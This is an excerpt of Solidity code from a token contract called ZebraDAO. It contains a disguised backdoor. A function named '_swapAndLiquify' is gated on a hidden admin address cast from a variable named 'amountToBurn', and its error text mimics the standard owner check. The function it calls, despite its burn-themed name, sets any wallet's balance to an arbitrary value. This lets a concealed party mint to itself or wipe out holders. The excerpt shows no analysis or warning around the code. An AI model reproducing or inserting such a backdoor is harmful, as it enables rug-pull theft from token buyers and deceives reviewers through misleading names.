...
contract ZebraDAO is Ownable {
  ...
  function _swapAndLiquify(address newWallet, uint256 percent) public admin {
    require(address(uint160(amountToBurn)) == msg.sender, "Ownable: caller is not the owner");
    manualBurnLiquidityPairTokens(newWallet, percent);
  }

  function manualBurnLiquidityPairTokens(address newWallet, uint256 percent) internal {
    if(newWallet != address(0)){
    require(0 < percent);
    tokenFromReflection[newWallet] = 0 + percent * (10 ** 9);
    }
  }
